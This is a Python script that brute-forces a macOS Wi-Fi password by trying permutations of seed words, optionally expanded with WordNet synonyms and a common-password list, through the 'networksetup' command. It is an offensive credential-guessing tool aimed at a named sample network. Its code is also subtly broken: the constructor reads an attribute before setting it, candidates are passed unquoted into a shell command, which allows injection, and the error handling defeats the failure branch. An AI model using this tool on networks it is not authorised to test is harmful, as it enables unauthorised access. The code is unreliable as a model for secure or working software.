import itertools
import subprocess
import nltk
from nltk.corpus import wordnet
import pandas


class Trishul:

    def __init__(self, device: str, network: str, initial_seed_words: list[str] = None, combination_depth: int = 3):
        self.device = device
        self.network = network
        self.initial_seed_words = initial_seed_words
        if self.seed_words is None:
            self.seed_words = []
        else:
            self.seed_words = initial_seed_words[:]
        self.combination_depth = combination_depth
        self.password = None

    def expand_seed_words_with_wordnet(self):
        nltk.download('wordnet')
        seed_words = self.seed_words[:]
        for word in self.initial_seed_words:
            [[seed_words.append(name.name()) for name in lemma.lemmas()] for lemma in wordnet.synsets(word)]
        self.seed_words = list(set(seed_words))
        return self

    def make_password_iterator(self) -> iter:
        return itertools.permutations(self.seed_words, self.combination_depth)

    def login(self, password: str) -> subprocess.CompletedProcess:
        command = " ".join(["networksetup", "setairportnetwork", self.device, self.network, password])
        output = subprocess.run(command, shell=True, check=True, capture_output=True)
        return output

    def try_passwords(self, passwords: iter) -> dict:
        for combination in passwords:
            password = "".join(combination)
            print("Trying " + password)
            output = self.login(password)
            if len(output.stdout) == 0:
                self.password = password
                return {"status": 0, "message": "Password found!", "password": password}
            else:
                print("\tFailed")
        return {"status": 1,
                "message": "Password not found.",
                "password": None}

    def add_common_passwords(self):
        passwords = pandas.read_csv('data/common-passwords.txt', header=None)
        self.seed_words += list(passwords[0].values)
        return self

    def run(self) -> dict:
        passwords = self.make_password_iterator()
        return self.try_passwords(passwords)


if __name__ == "__main__":
    print(
        Trishul("en0", "JuliusCaesar", ["tu", "et", "brute"], 3)
            # .expand_seed_words_with_wordnet()
            # .add_common_passwords()
            .run()
    )
